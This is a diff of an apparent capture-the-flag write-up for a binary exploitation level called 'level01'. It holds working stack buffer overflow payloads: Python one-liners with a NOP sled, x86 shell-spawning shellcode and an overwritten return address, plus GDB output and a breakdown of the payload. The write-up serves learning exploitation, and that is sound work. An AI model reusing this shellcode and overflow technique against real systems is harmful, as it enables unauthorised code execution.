@@ -10,7 +10,7 @@ r < <(python -c 'print "dat_wil\n" + "A"*84')
 => Then we create a payload that overwrite the ret addr of main and redirect it to a shellcode inside the buffer
 python -c 'print "dat_wil\n" + "\x90"*(80-28) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\xec\xd5\xff\xff"'
 
-=> It doesn't work, we have a SEGFAULT 
+=> It doesn't work, we have a SEGFAULT
 0xffffd72d in ?? ()
 
 0xffffd720:	0x6850c031	0x68732f2f	0x69622f68	0x00000001 <- (0x1 ??)
@@ -21,7 +21,31 @@ python -c 'print "dat_wil\n" + "\x90"*(80-28) + "\x31\xc0\x50\x68\x2f\x2f\x73\x6
 
 => Let's test to write the payload before:
 r < <(python -c 'print "dat_wil\n" + "\x90"*20 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A"*(80 - 48) + "\xec\xd6\xff\xff"')
-=> /bin/dash new process is executed 
+=> /bin/dash new process is executed
 
 
 (python -c 'print "dat_wil\n" + "\x90"*20 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A"*(80 - 48) + "\xec\xd6\xff\xff"'; cat) | ./level01
+
+-----------------------------------------------------------------------------------
+
+1. Vulnerability: buffer overflow
+
+	- A buffer overflow exists in the buffer_password array. The program allocates 64 bytes for the buffer but allows input of up to 100 bytes via fgets. This enables overwriting the return address on the stack.
+
+2. GDB
+
+	```bash
+	run < <(python -c 'print "dat_wil\n" + "A"*80 + "BBBB"')
+	```
+
+3. Payload
+
+	```python
+	(python -c 'print "dat_wil\n" + "\x90"*16 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "A"*40  + "\xec\xd6\xff\xff"'; cat) | ./level01
+	```
+
+	- `dat_wil\n` : username and past second input
+	- `\x90` : NOP sled to align memory
+	- `\x31\xc0\..\xcd\x80` : shellcode
+	- `"A"*40` : padding to reach the return address
+	- `"\xec\xd6\xff\xff"` : Overwritten return adress to point to the NOP sled or shellcode
